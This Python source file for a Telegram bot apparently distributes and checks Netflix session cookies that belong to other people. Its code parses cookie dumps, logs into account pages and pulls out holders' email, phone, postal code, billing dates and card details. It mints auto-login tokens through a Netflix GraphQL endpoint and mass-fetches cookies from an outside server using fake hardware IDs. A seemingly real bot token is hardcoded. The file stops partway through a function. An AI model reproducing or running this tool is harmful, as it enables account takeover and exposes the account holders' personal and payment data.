#!/usr/bin/env python3
# ─── Imports ───────────────────────────────────────────────────────────────────
import os
import re
import io
import json
import time
import random
import sqlite3
import zipfile
import logging
import datetime
import threading
import traceback
from typing import Optional
from dotenv import load_dotenv
import requests
import telebot
from telebot import types as tbt

# ─── Env / Config ──────────────────────────────────────────────────────────────
load_dotenv()

BOT_TOKEN: str   = os.getenv("BOT_TOKEN", "8670413766:AAFF_2pyVK-VuTlRxk6yeUvFXVPmxuFStXE")
ADMIN_ID:  int   = int(os.getenv("ADMIN_ID", "6118019289"))
COOLDOWN_S: float = 2.0          # seconds between requests per user
MAX_FILE_BYTES: int = 20 * 1024 * 1024   # 20 MB
DB_PATH: str = os.getenv("DB_PATH", "nftoken.db")

GEN_API_FREE    = "https://license-server-neon.vercel.app/api/fetch-free-cookie"
GEN_API_PREMIUM = "https://license-server-neon.vercel.app/api/fetch-premium-cookie"
PREMIUM_KEY     = os.getenv("PREMIUM_KEY", "")

ANDROID_ENDPOINTS = [
    {"url": "https://android13.prod.ftl.netflix.com/graphql", "uas": [
        "com.netflix.mediaclient/63884 (Linux; U; Android 13; en; Pixel 7 Pro; Build/TQ3A.230705.001; Cronet/143.0.7445.0)",
        "com.netflix.mediaclient/63884 (Linux; U; Android 13; ro; M2007J3SG; Build/TQ1A.230205.001.A2; Cronet/143.0.7445.0)",
    ]},
]

# ─── Logger ────────────────────────────────────────────────────────────────────
logging.basicConfig(
    format="%(asctime)s %(message)s",
    datefmt="%H:%M:%S",
    level=logging.INFO,
)
_logger = logging.getLogger("nftoken")

def _log(tag: str, msg: str) -> None:
    _logger.info(f"{tag} {msg}")

class log:
    ok      = staticmethod(lambda m: _log("[  OK  ]", m))
    fail    = staticmethod(lambda m: _log("[ FAIL ]", m))
    warn    = staticmethod(lambda m: _log("[ WARN ]", m))
    error   = staticmethod(lambda m: _log("[ERROR ]", m))
    step    = staticmethod(lambda m: _log("[ STEP ]", m))
    info    = staticmethod(lambda m: _log("[ INFO ]", m))
    verify  = staticmethod(lambda m: _log("[VERIFY]", m))
    init    = staticmethod(lambda m: _log("[ INIT ]", m))


# ─── Database (SQLite) ─────────────────────────────────────────────────────────
_db_lock = threading.Lock()

def _get_conn() -> sqlite3.Connection:
    conn = sqlite3.connect(DB_PATH, check_same_thread=False)
    conn.row_factory = sqlite3.Row
    return conn

def db_init() -> None:
    """Create tables if they don't exist."""
    with _db_lock:
        conn = _get_conn()
        c = conn.cursor()
        c.executescript("""
            CREATE TABLE IF NOT EXISTS users (
                user_id          INTEGER PRIMARY KEY,
                username         TEXT,
                first_name       TEXT,
                gen_count_today  INTEGER NOT NULL DEFAULT 0,
                daily_reset_date TEXT    NOT NULL DEFAULT '',
                is_approved      INTEGER NOT NULL DEFAULT 0,
                created_at       TEXT    NOT NULL DEFAULT (datetime('now'))
            );

            CREATE TABLE IF NOT EXISTS cookies (
                id           INTEGER PRIMARY KEY AUTOINCREMENT,
                cookie_string TEXT NOT NULL UNIQUE,
                source        TEXT,
                status        TEXT NOT NULL DEFAULT 'UNCHECKED',
                created_at    TEXT NOT NULL DEFAULT (datetime('now'))
            );

            CREATE TABLE IF NOT EXISTS check_log (
                id         INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id    INTEGER,
                action     TEXT,
                success    INTEGER,
                created_at TEXT NOT NULL DEFAULT (datetime('now'))
            );
        """)
        conn.commit()
        conn.close()
    log.init(f"SQLite DB ready at {DB_PATH}")


# ─── Credit / User Manager ─────────────────────────────────────────────────────
def _today() -> str:
    return datetime.date.today().isoformat()


def ensure_user(user_id: int, username: str = None, first_name: str = None) -> dict:
    """Ensure user row exists and reset daily counter. Returns user dict."""
    today = _today()
    with _db_lock:
        conn = _get_conn()
        c = conn.cursor()
        row = c.execute("SELECT * FROM users WHERE user_id=?", (user_id,)).fetchone()

        if row:
            updates = {}
            row = dict(row)

            # Daily reset
            if row["daily_reset_date"] != today:
                updates["gen_count_today"] = 0
                updates["daily_reset_date"] = today
                row["gen_count_today"] = 0

            # Username / name update
            if row.get("username") != username or row.get("first_name") != first_name:
                updates["username"] = username
                updates["first_name"] = first_name

            if updates:
                set_clause = ", ".join(f"{k}=?" for k in updates)
                vals = list(updates.values()) + [user_id]
                c.execute(f"UPDATE users SET {set_clause} WHERE user_id=?", vals)
                conn.commit()

            conn.close()
            row.update(updates)
            return row
        else:
            new_row = {
                "user_id": user_id,
                "username": username,
                "first_name": first_name,
                "gen_count_today": 0,
                "daily_reset_date": today,
                "is_approved": 0,
            }
            c.execute(
                "INSERT INTO users (user_id,username,first_name,"
                "gen_count_today,daily_reset_date,is_approved) VALUES (?,?,?,?,?,?)",
                (user_id, username, first_name, 0, today, 0),
            )
            conn.commit()
            conn.close()
            return new_row


def is_approved(user_id: int) -> bool:
    if user_id == ADMIN_ID:
        return True
    with _db_lock:
        conn = _get_conn()
        row = conn.execute("SELECT is_approved FROM users WHERE user_id=?", (user_id,)).fetchone()
        conn.close()
    return bool(row and row["is_approved"])


def approve_user(user_id: int) -> None:
    with _db_lock:
        conn = _get_conn()
        conn.execute("UPDATE users SET is_approved=1 WHERE user_id=?", (user_id,))
        conn.commit()
        conn.close()




def increment_gen(user_id: int) -> None:
    with _db_lock:
        conn = _get_conn()
        conn.execute(
            "UPDATE users SET gen_count_today=gen_count_today+1 WHERE user_id=?",
            (user_id,),
        )
        conn.commit()
        conn.close()


def log_interaction(user_id: int, action: str, success: bool) -> None:
    with _db_lock:
        conn = _get_conn()
        conn.execute(
            "INSERT INTO check_log (user_id,action,success) VALUES (?,?,?)",
            (user_id, action, 1 if success else 0),
        )
        conn.commit()
        conn.close()


def get_all_users() -> list[dict]:
    with _db_lock:
        conn = _get_conn()
        rows = conn.execute("SELECT * FROM users ORDER BY created_at DESC").fetchall()
        conn.close()
    return [dict(r) for r in rows]


def get_global_stats() -> dict:
    with _db_lock:
        conn = _get_conn()
        total_users = conn.execute("SELECT COUNT(*) FROM users").fetchone()[0]
        total_checks = conn.execute("SELECT COUNT(*) FROM check_log").fetchone()[0]
        alive_checks = conn.execute("SELECT COUNT(*) FROM check_log WHERE success=1").fetchone()[0]
        today_str = _today()
        today_checks = conn.execute(
            "SELECT COUNT(*) FROM check_log WHERE date(created_at)=?", (today_str,)
        ).fetchone()[0]
        today_alive = conn.execute(
            "SELECT COUNT(*) FROM check_log WHERE success=1 AND date(created_at)=?", (today_str,)
        ).fetchone()[0]
        conn.close()
    return {
        "totalUsers": total_users,
        "totalChecks": total_checks,
        "aliveChecks": alive_checks,
        "todayChecks": today_checks,
        "todayAlive": today_alive,
    }


# ─── Cookies DB ────────────────────────────────────────────────────────────────
def db_insert_cookies(cookies: list[dict]) -> int:
    """Upsert cookies. Returns number inserted (not updated)."""
    if not cookies:
        return 0
    inserted = 0
    with _db_lock:
        conn = _get_conn()
        for item in cookies:
            try:
                conn.execute(
                    "INSERT INTO cookies (cookie_string,source,status) VALUES (?,?,?)",
                    (item["cookie_string"], item.get("source", ""), item.get("status", "UNCHECKED")),
                )
                inserted += 1
            except sqlite3.IntegrityError:
                pass  # duplicate
        conn.commit()
        conn.close()
    return inserted


def db_get_live_cookie() -> Optional[dict]:
    with _db_lock:
        conn = _get_conn()
        rows = conn.execute(
            "SELECT id, cookie_string FROM cookies WHERE status='LIVE'"
        ).fetchall()
        conn.close()
    if not rows:
        return None
    row = random.choice(rows)
    return dict(row)


def db_get_cookies_for_health() -> list[dict]:
    with _db_lock:
        conn = _get_conn()
        rows = conn.execute("SELECT id, cookie_string FROM cookies").fetchall()
        conn.close()
    return [dict(r) for r in rows]


def db_update_status(cookie_id: int, status: str) -> None:
    with _db_lock:
        conn = _get_conn()
        conn.execute("UPDATE cookies SET status=? WHERE id=?", (status, cookie_id))
        conn.commit()
        conn.close()


def db_purge_dead() -> int:
    with _db_lock:
        conn = _get_conn()
        count = conn.execute("SELECT COUNT(*) FROM cookies WHERE status='DEAD'").fetchone()[0]
        conn.execute("DELETE FROM cookies WHERE status='DEAD'")
        conn.commit()
        conn.close()
    return count


def db_get_stats() -> dict:
    with _db_lock:
        conn = _get_conn()
        rows = conn.execute("SELECT status, COUNT(*) as cnt FROM cookies GROUP BY status").fetchall()
        conn.close()
    stats = {"unchecked": 0, "live": 0, "dead": 0}
    for r in rows:
        s = r["status"].upper()
        if s == "UNCHECKED":
            stats["unchecked"] = r["cnt"]
        elif s == "LIVE":
            stats["live"] = r["cnt"]
        elif s == "DEAD":
            stats["dead"] = r["cnt"]
    return stats


# ─── Cookie Parser ─────────────────────────────────────────────────────────────
WANTED_KEYS = ["NetflixId", "SecureNetflixId", "nfvdid", "OptanonConsent"]


def _build_cookie_str(d: dict) -> str:
    return "; ".join(f"{k}={v}" for k, v in d.items() if v)


def _parse_netscape(content: str) -> list[dict]:
    result, current = [], {}
    for line in content.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        parts = line.split("\t")
        if len(parts) >= 7:
            current[parts[5]] = parts[6]
            if "NetflixId" in current:
                result.append(dict(current))
                current = {}
    return result


def _extract_from_raw(line: str) -> Optional[dict]:
    d = {}
    for key in WANTED_KEYS:
        m = re.search(
            r'(?:^|[;|\s])\s*' + re.escape(key) + r'\s*[:=]\s*([^;|\n]+)',
            line, re.IGNORECASE
        )
        if m:
            d[key] = m.group(1).strip()
    return d if (d.get("NetflixId") or d.get("SecureNetflixId")) else None


def _from_cookie_array(arr: list) -> dict:
    d = {}
    for c in arr:
        if isinstance(c, dict):
            name = str(c.get("name", ""))
            val  = str(c.get("value", ""))
            if name and val:
                d[name] = val
    return d


def _extract_from_json(data) -> list[dict]:
    out = []
    items = data if isinstance(data, list) else [data]

    for item in items:
        if not isinstance(item, dict):
            continue
        if isinstance(item.get("cookies"), list):
            d = _from_cookie_array(item["cookies"])
            if d.get("NetflixId") or d.get("SecureNetflixId"):
                out.append(d)
            continue
        if isinstance(item.get("name"), str) and isinstance(item.get("value"), str):
            d = _from_cookie_array(items)
            if d.get("NetflixId") or d.get("SecureNetflixId"):
                out.append(d)
            break
        # plain dict
        d = {k: str(item[k]) for k in WANTED_KEYS if k in item}
        if d:
            out.append(d)

    # Keyed objects
    if not out and isinstance(data, dict):
        for val in data.values():
            if isinstance(val, list) and val and isinstance(val[0], dict) and "name" in val[0]:
                d = _from_cookie_array(val)
                if d.get("NetflixId") or d.get("SecureNetflixId"):
                    out.append(d)
    return out


def extract_cookies(text: str) -> list[dict]:
    """Extract Netflix cookie dicts from any text format."""
    # 1. Netscape
    if "\t" in text and ("NetflixId" in text or "nfvdid" in text):
        ns = _parse_netscape(text)
        if ns:
            return ns

    # 2. JSON
    try:
        data = json.loads(text)
        found = _extract_from_json(data)
        if found:
            return found
    except Exception:
        pass

    # NDJSON
    if "\n" in text and ("{" in text or "[" in text):
        results = []
        for raw in text.splitlines():
            t = raw.strip()
            if not t or not (t.startswith("{") or t.startswith("[")):
                continue
            try:
                for d in _extract_from_json(json.loads(t)):
                    results.append(d)
            except Exception:
                pass
        if results:
            return results

    # 3. Raw string
    out = []
    big = _extract_from_raw(text)
    if big:
        out.append(big)

    for raw in text.splitlines():
        t = raw.strip()
        if not t:
            continue
        pipe_m = re.match(r'NetflixCookies\s*=\s*(.+?)(?:\s*\|\s*|$)', t, re.IGNORECASE)
        if pipe_m:
            parsed = _extract_from_raw(pipe_m.group(1).strip())
            if parsed:
                out.append(parsed)
            continue
        parsed = _extract_from_raw(t)
        if parsed:
            is_dup = any(
                e.get("NetflixId") == parsed.get("NetflixId") and
                e.get("SecureNetflixId") == parsed.get("SecureNetflixId")
                for e in out
            )
            if not is_dup:
                out.append(parsed)

    return out


# ─── Netflix Checker ───────────────────────────────────────────────────────────
WEB_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36"
                  " (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9",
}


def _unescape(s: str) -> str:
    return re.sub(r'\\x([0-9a-fA-F]{2})', lambda m: chr(int(m.group(1), 16)), s)


def _extract_account_info(html: str, profiles_html: str = "") -> dict:
    info = {}

    ctx_m = re.search(r'netflix\.reactContext\s*=\s*({.+?});\s*</script>', html, re.DOTALL)
    if ctx_m:
        try:
            json_str = re.sub(r'\\x([0-9a-fA-F]{2})',
                               lambda m: chr(int(m.group(1), 16)), ctx_m.group(1))
            ctx = json.loads(json_str)
            models = ctx.get("models", {})

            member_ctx = (models.get("memberContext", {}).get("data")
                          or models.get("memberContext", {}))
            user_info = member_ctx.get("userInfo", member_ctx)

            for src_key, dst_key in [
                ("countryOfSignup", "country"),
                ("memberSince", "memberSince"),
                ("emailAddress", "email"),
                ("firstName", "firstName"),
                ("phoneNumber", "phoneNumber"),
                ("postalCode", "postalCode"),
                ("membershipStatus", "membershipStatus"),
            ]:
                if user_info.get(src_key):
                    info[dst_key] = _unescape(str(user_info[src_key]))
            for bool_key in ["isPhoneVerified", "isAgeVerified", "isUserOnHold"]:
                if isinstance(user_info.get(bool_key), bool):
                    info[bool_key.replace("is", "").lower()] = user_info[bool_key]

            acct = user_info.get("accountAttributes", member_ctx.get("accountAttributes", {}))
            if not info.get("membershipStatus") and acct.get("membershipStatus"):
                info["membershipStatus"] = _unescape(str(acct["membershipStatus"]))

            plan_info = models.get("planBillboardContext", {}).get("data", {})
            if plan_info.get("currentPlanName"):
                info["plan"] = plan_info["currentPlanName"]
            if plan_info.get("maxStreams"):
                info["maxStreams"] = int(plan_info["maxStreams"])

            billing = (models.get("billingContext", {}).get("data")
                       or models.get("billingOverview", {}).get("data", {}))
            for k in ["nextBillingDate", "nextRenewalDate"]:
                if not info.get("nextBillingDate") and billing.get(k):
                    info["nextBillingDate"] = billing[k]

            payment = (models.get("paymentContext", {}).get("data")
                       or models.get("currentPaymentMethod", {}).get("data", {}))
            for k in ["paymentType", "cardBrand"]:
                if payment.get(k):
                    info[k] = payment[k]
            for k in ["cardLastFourDigits", "lastFourDigits"]:
                if not info.get("cardLast4") and payment.get(k):
                    info["cardLast4"] = payment[k]

            # Deep scan
            for mdata in [m.get("data") for m in models.values() if isinstance(m, dict)]:
                if not isinstance(mdata, dict):
                    continue
                for f, d in [("nextBillingDate", "nextBillingDate"),
                               ("nextRenewalDate", "nextBillingDate"),
                               ("paymentType", "paymentType"),
                               ("cardBrand", "cardBrand"),
                               ("membershipStatus", "membershipStatus"),
                               ("phoneNumber", "phoneNumber"),
                               ("postalCode", "postalCode")]:
                    if not info.get(d) and mdata.get(f):
                        info[d] = _unescape(str(mdata[f]))
                if not info.get("cardLast4"):
                    for k in ["cardLastFourDigits", "lastFourDigits"]:
                        if mdata.get(k):
                            info["cardLast4"] = _unescape(str(mdata[k]))
                if not info.get("maxStreams") and mdata.get("maxStreams"):
                    info["maxStreams"] = int(mdata["maxStreams"])

            # Profiles from /account/profiles page
            all_names = set()
            if profiles_html:
                for m in re.finditer(
                    r'data-uia="menu-card\+account-profiles-page\+profiles-menu-card\+([^"]+)\+item\+label"',
                    profiles_html
                ):
                    all_names.add(_unescape(m.group(1)))

            if not all_names:
                for mdata in [m.get("data") for m in models.values() if isinstance(m, dict)]:
                    if isinstance(mdata, dict) and isinstance(mdata.get("profiles"), list):
                        for p in mdata["profiles"]:
                            if p.get("profileName"):
                                all_names.add(_unescape(p["profileName"]))

            if not all_names:
                for m in re.finditer(r'"profileName"\s*:\s*"([^"]+)"', html):
                    all_names.add(_unescape(m.group(1)))

            if all_names:
                info["profiles"] = len(all_names)
                info["profileNames"] = list(all_names)

            price_m = re.search(
                r'"totalPrice":\{"__typename":"GrowthPrice","priceFormatted":"([^"]+)"', html)
            if price_m:
                info["planPrice"] = _unescape(price_m.group(1))

            vq_m = re.search(r'"videoQuality":\{"fieldType":"String","value":"([^"]+)"\}', html)
            if vq_m:
                info["videoQuality"] = vq_m.group(1)

        except Exception:
            pass

    # Regex fallbacks
    for pattern, key in [
        (r'"planName"\s*:\s*"([^"]+)"', "plan"),
        (r'"emailAddress"\s*:\s*"([^"]+)"', "email"),
        (r'"countryOfSignup"\s*:\s*"([^"]+)"', "country"),
        (r'"memberSince"\s*:\s*"([^"]+)"', "memberSince"),
        (r'"phoneNumber"\s*:\s*"([^"]+)"', "phoneNumber"),
        (r'"membershipStatus"\s*:\s*"([^"]+)"', "membershipStatus"),
        (r'"nextBillingDate"\s*:\s*"([^"]+)"', "nextBillingDate"),
        (r'"paymentType"\s*:\s*"([^"]+)"', "paymentType"),
        (r'"cardBrand"\s*:\s*"([^"]+)"', "cardBrand"),
        (r'"(?:cardLastFourDigits|lastFourDigits)"\s*:\s*"([^"]+)"', "cardLast4"),
        (r'"postalCode"\s*:\s*"([^"]+)"', "postalCode"),
        (r'"maxStreams"\s*:\s*(\d+)', "maxStreams"),
    ]:
        if not info.get(key):
            m = re.search(pattern, html)
            if m:
                info[key] = _unescape(m.group(1))

    if not info.get("membershipStatus") and "FORMER_MEMBER" in html:
        info["membershipStatus"] = "FORMER_MEMBER"

    if not info.get("profileNames"):
        ms = re.findall(r'"profileName"\s*:\s*"([^"]+)"', html)
        if ms:
            names = list(dict.fromkeys(_unescape(n) for n in ms))
            info["profiles"] = len(names)
            info["profileNames"] = names

    if not info.get("planPrice"):
        m = re.search(r'"totalPrice":\{"__typename":"GrowthPrice","priceFormatted":"([^"]+)"', html)
        if m:
            info["planPrice"] = _unescape(m.group(1))
    if not info.get("videoQuality"):
        m = re.search(r'"videoQuality":\{"fieldType":"String","value":"([^"]+)"\}', html)
        if m:
            info["videoQuality"] = m.group(1)
    if not info.get("extraMember"):
        m = re.search(r'"showExtraMemberSection":\{"fieldType":"Boolean","value":([^}]+)\}', html)
        if m:
            info["extraMember"] = "Yes✅" if "true" in m.group(1).lower() else "No❌"

    return info if info else {}


def generate_token(cookie_dict: dict) -> Optional[dict]:
    """Try Android GraphQL endpoints to get auto-login token. Returns {token, endpoint} or None."""
    cookie_str = _build_cookie_str(cookie_dict)
    body = json.dumps({
        "operationName": "CreateAutoLoginToken",
        "variables": {"scope": "WEBVIEW_MOBILE_STREAMING"},
        "extensions": {"persistedQuery": {"version": 102, "id": "76e97129-f4b5-41a0-a73c-12e674896849"}},
    })

    endpoints = [
        {"url": ep["url"], "ua": random.choice(ep["uas"])}
        for ep in ANDROID_ENDPOINTS
    ]
    random.shuffle(endpoints)
    endpoints = endpoints[:3]

    for ep in endpoints:
        try:
            headers = {
                "User-Agent": ep["ua"],
                "Accept": "multipart/mixed;deferSpec=20220824, application/graphql-response+json, application/json",
                "Content-Type": "application/json",
                "Origin": "https://www.netflix.com",
                "Referer": "https://www.netflix.com/",
                "Cookie": cookie_str,
            }
            resp = requests.post(ep["url"], headers=headers, data=body, timeout=10)
            j = resp.json()
            token_data = j.get("data", {}).get("createAutoLoginToken")
            if token_data:
                token_str = token_data if isinstance(token_data, str) else json.dumps(token_data)
                token_url = f"https://netflix.com/?nftoken={token_str}"
                log.verify(f"Token via {ep['url'].split('/')[-1]}")
                return {"token": token_url, "endpoint": ep["url"]}
        except Exception:
            continue
    log.fail("Token generation failed on all endpoints")
    return None


def check_cookie(cookie_dict: dict, batch_mode: bool = False, generate_token_flag: bool = False) -> dict:
    """
    Returns {success, info, error, token, tokenEndpoint}
    """
    if not cookie_dict.get("NetflixId"):
        return {"success": False, "info": None, "error": "Missing: NetflixId", "token": None, "tokenEndpoint": None}

    cookie_str = _build_cookie_str(cookie_dict)
    headers = {**WEB_HEADERS, "Cookie": cookie_str}

    url = "https://www.netflix.com/YourAccount?lng=en"
    html = ""
    final_status = 0
    session = requests.Session()

    try:
        for _ in range(6):
            resp = session.get(url, headers=headers, allow_redirects=False, timeout=10)
            final_status = resp.status_code

            if 300 <= final_status < 400:
                location = resp.headers.get("Location", "")
                if re.search(r'/login', location, re.IGNORECASE):
                    if not batch_mode:
                        log.fail("Cookie redirected to login")
                    return {"success": False, "info": None,
                            "error": "Cookie expired (redirected to login)", "token": None, "tokenEndpoint": None}
                url = location if location.startswith("http") else f"https://www.netflix.com{location}"
                continue

            if final_status == 403:
                return {"success": False, "info": None,
                        "error": "Access forbidden (403)", "token": None, "tokenEndpoint": None}

            if final_status != 200:
                return {"success": False, "info": None,
                        "error": f"HTTP {final_status}", "token": None, "tokenEndpoint": None}

            html = resp.text
            break

        if not html:
            return {"success": False, "info": None, "error": "No response body", "token": None, "tokenEndpoint": None}

        if any(x in html for x in ["login-form", "/login?", "loginPage"]):
            return {"success": False, "info": None,
                    "error": "Cookie expired (login page returned)", "token": None, "tokenEndpoint": None}

        profiles_html = ""
        try:
            pr = session.get("https://www.netflix.com/account/profiles",
                             headers=headers, timeout=10)
            if pr.status_code == 200:
                profiles_html = pr.text
        except Exception:
            pass

        info = _extract_account_info(html, profiles_html)

        # Token generation
        tok_result = None
        if generate_token_flag and not batch_mode and info.get("membershipStatus") != "FORMER_MEMBER":
            tok_result = generate_token(cookie_dict)

        return {
            "success": True,
            "info": info or {"plan": "Unknown", "country": "Unknown"},
            "error": None,
            "token": tok_result["token"] if tok_result else None,
            "tokenEndpoint": tok_result["endpoint"] if tok_result else None,
        }

    except requests.Timeout:
        if not batch_mode:
            log.error("Cookie check timed out")
        return {"success": False, "info": None, "error": "Request timeout", "token": None, "tokenEndpoint": None}
    except Exception as e:
        return {"success": False, "info": None, "error": f"Request error: {e}", "token": None, "tokenEndpoint": None}


# ─── Cookie Generator (Vercel sources) ────────────────────────────────────────
def _gen_hwid() -> str:
    chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_"
    return "DEV-HW-" + "".join(random.choice(chars) for _ in range(32))


def _fetch_vercel(url: str, body: dict) -> Optional[str]:
    try:
        resp = requests.post(
            url, json=body,
            headers={"Content-Type": "application/json",
                     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"},
            timeout=10
        )
        data = resp.json()
        if data.get("success") and data.get("cookieString"):
            return data["cookieString"].strip()
    except Exception:
        pass
    return None


def scrape_pool() -> list[str]:
    """Fetch cookies from Vercel sources."""
    import concurrent.futures

    futures_args = [(GEN_API_FREE, {"deviceHardwareId": _gen_hwid()}) for _ in range(30)]
    if PREMIUM_KEY:
        futures_args += [(GEN_API_PREMIUM, {"key": PREMIUM_KEY, "deviceHardwareId": _gen_hwid()})
                         for _ in range(10)]

    results = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as ex:
        futs = [ex.submit(_fetch_vercel, url, body) for url, body in futures_args]
        for f in concurrent.futures.as_completed(futs):
            r = f.result()
            if r:
                results.append(r)

    random.shuffle(results)
    seen, out = set(), []
    for c in results:
        if c not in seen:
            seen.add(c)
            out.append(c)
    return out


# ─── Helpers ───────────────────────────────────────────────────────────────────
def esc(s: str) -> str:
    return (s or "").replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")


def fmt_ms(ms: float) -> str:
    return f"{ms:.0f}ms" if ms < 1000 else f"{ms/1000:.1f}s"


def progress_bar(current: int, total: int, width: int = 20) -> str:
    ratio = min(current / max(total, 1), 1)
    filled = round(ratio * width)
    return "■" * filled + "□" * (width - filled) + f" {round(ratio * 100)}%"


def date_stamp() -> str:
    return datetime.datetime.utcnow().strftime("%Y%m%d_%H%M%S")


def format_account_info_html(info: dict) -> str:
    if not info:
        return ""
    lines = []
    if info.get("email"):
        lines.append(f"📧 <b>Email:</b> <code>{esc(info['email'])}</code>")
    if info.get("phoneNumber") is not None:
        lines.append(f"📞 <b>Phone:</b> {esc(str(info['phoneNumber'])) or 'None'}")
    if info.get("country"):
        lines.append(f"🌍 <b>Country:</b> {esc(info['country'])}")
    if info.get("memberSince"):
        lines.append(f"📅 <b>Member Since:</b> {esc(info['memberSince'])}")
    if info.get("videoQuality"):
        lines.append(f"📺 <b>Video Quality:</b> {esc(info['videoQuality'])}")
    if info.get("maxStreams") is not None:
        lines.append(f"📺 <b>Max Streams:</b> {info['maxStreams']}")
    if info.get("extraMember") is not None:
        lines.append(f"👥 <b>Extra Member:</b> {esc(str(info['extraMember']))}")
    if info.get("membershipStatus"):
        lines.append(f"🏷 <b>Status:</b> {esc(info['membershipStatus'])}")
    profile_names = info.get("profileNames")
    if profile_names:
        lines.append(f"👥 <b>Profiles:</b> {', '.join(esc(n) for n in profile_names)}")
    elif info.get("profiles"):
        lines.append(f"👥 <b>Profiles:</b> {info['profiles']}")
    return "\n".join(lines)


def format_account_info_plain(info: dict) -> str:
    if not info:
        return "No details"
    parts = []
    for key, label in [
        ("email", "Email"), ("firstName", "First Name"), ("plan", "Plan"),
        ("phoneNumber", "Phone"), ("country", "Country"), ("postalCode", "Postal Code"),
        ("memberSince", "Member Since"), ("planPrice", "Plan Price"),
        ("videoQuality", "Video Quality"), ("maxStreams", "Max Streams"),
        ("membershipStatus", "Status"), ("nextBillingDate", "Next Billing"),
        ("paymentType", "Payment Type"), ("cardBrand", "Card Brand"),
        ("cardLast4", "Card Last 4"), ("extraMember", "Extra Member"),
    ]:
        if info.get(key) is not None:
            parts.append(f"{label}: {info[key]}")
    profile_names = info.get("profileNames")
    if profile_names:
        parts.append(f"Profiles: {', '.join(profile_names)}")
    elif info.get("profiles"):
        parts.append(f"Profiles: {info['profiles']}")
    return " | ".join(parts) if parts else "No details"


# ─── Bot Shared State ──────────────────────────────────────────────────────────
cooldowns: dict[int, float] = {}         # user_id -> last request timestamp (seconds)
batch_mode_users: set[int] = set()       # users waiting to upload a batch file
upload_mode_users: set[int] = set()      # admin waiting to upload cookies to DB
active_batches: dict[str, bool] = {}     # batchId -> running?


def check_cooldown(user_id: int) -> float:
    """Return remaining wait in seconds, 0 if allowed."""
    if user_id == ADMIN_ID:
        return 0.0
    last = cooldowns.get(user_id, 0.0)
    elapsed = time.time() - last
    if elapsed < COOLDOWN_S:
        return COOLDOWN_S - elapsed
    cooldowns[user_id] = time.time()
    return 0.0


def require_approval(bot: telebot.TeleBot, chat_id: int, user_id: int) -> bool:
    """Returns True if user is blocked (not approved)."""
    if user_id == ADMIN_ID or is_approved(user_id):
        return False
    bot.send_message(chat_id, "⛔ You need approval first. Type /start", parse_mode="HTML")
    return True


# ─── Loading Animation ────────────────────────────────────────────────────────
class LoadingAnimation:
    def __init__(self, bot: telebot.TeleBot, chat_id: int, message_id: int, prefix: str = "⏳ <b>Processing...</b>"):
        self._bot = bot
        self._chat_id = chat_id
        self._message_id = message_id
        self._prefix = prefix
        self._progress = 0
        self._running = False
        self._thread: Optional[threading.Thread] = None

    def start(self, speed_ms: int = 250):
        self._running = True
        self._thread = threading.Thread(target=self._loop, args=(speed_ms,), daemon=True)
        self._thread.start()

    def _loop(self, speed_ms: int):
        while self._running:
            if self._progress < 85:
                self._progress += random.randint(2, 11)
                if self._progress > 85:
                    self._progress = 85
            elif self._progress < 99:
                self._progress += 1

            filled = self._progress // 5
            bar = "▓" * filled + "░" * (20 - filled)
            text = f"{self._prefix}\n\n<code>[{bar} {self._progress:3d}%]</code>"
            try:
                self._bot.edit_message_text(text, self._chat_id, self._message_id, parse_mode="HTML")
            except Exception:
                pass
            time.sleep(speed_ms / 1000)

    def stop(self):
        self._running = False
        if self._thread:
            self._thread.join(timeout=1)


# ─── Bot Initialization ────────────────────────────────────────────────────────
db_init()
bot = telebot.TeleBot(BOT_TOKEN, parse_mode=None)
log.init("Telegram bot initialized")


# ─── /start ────────────────────────────────────────────────────────────────────
def send_hub(chat_id: int, user_id: int, msg_from, message_id_to_edit: int = None):
    user = ensure_user(user_id, getattr(msg_from, "username", None), getattr(msg_from, "first_name", None))
    is_admin = (user_id == ADMIN_ID)
    name = esc(getattr(msg_from, "first_name", None) or "User")
    gen_today = user.get("gen_count_today", 0)

    text = (
        f"🔴 <b>Welcome to NFToken Bot</b> 🔴\n\n"
        f"👤 <b>User:</b> {name} (<code>{user_id}</code>)\n"
        f"⚡ <b>Generated Today:</b> {gen_today}\n\n"
        f"What would you like to do?"
    )

    kb = tbt.InlineKeyboardMarkup()
    kb.add(tbt.InlineKeyboardButton("🍿 Get Netflix Account", callback_data="hub_gen"))
    kb.add(tbt.InlineKeyboardButton("🔍 How to Check & Tokenize", callback_data="hub_chk_help"))

    if message_id_to_edit:
        try:
            bot.edit_message_text(text, chat_id, message_id_to_edit, parse_mode="HTML", reply_markup=kb)
        except Exception:
            pass
    else:
        bot.send_message(chat_id, text, parse_mode="HTML", reply_markup=kb)


@bot.message_handler(commands=["start"])
def cmd_start(msg: tbt.Message):
    user_id  = msg.from_user.id
    username = msg.from_user.username
    first    = msg.from_user.first_name or "User"

    user = ensure_user(user_id, username, first)

    if not user.get("is_approved") and user_id != ADMIN_ID:
        log.info(f"Pending access from {first} ({user_id})")
        tag = f"@{esc(username)}" if username else esc(first)
        kb = tbt.InlineKeyboardMarkup()
        kb.row(
            tbt.InlineKeyboardButton("✅ Approve", callback_data=f"access_approve_{user_id}"),
            tbt.InlineKeyboardButton("❌ Deny",    callback_data=f"access_deny_{user_id}"),
        )
        bot.send_message(
            ADMIN_ID,
            f"🆕 <b>New Access Request</b>\n\n👤 {tag} (<code>{user_id}</code>)",
            parse_mode="HTML", reply_markup=kb
        )
        bot.send_message(
            msg.chat.id,
            f"👋 <b>Welcome, {esc(first)}!</b>\n\n"
            f"⏳ Your access request is pending.\n"
            f"You'll be notified once approved by the owner.",
            parse_mode="HTML"
        )
        return

    log.info(f"/start from approved user {first} ({user_id})")
    send_hub(msg.chat.id, user_id, msg.from_user)


# ─── /gen ──────────────────────────────────────────────────────────────────────
def process_gen(chat_id: int, user_id: int, username: str = None, first_name: str = None):
    if require_approval(bot, chat_id, user_id):
        return

    ensure_user(user_id, username, first_name)

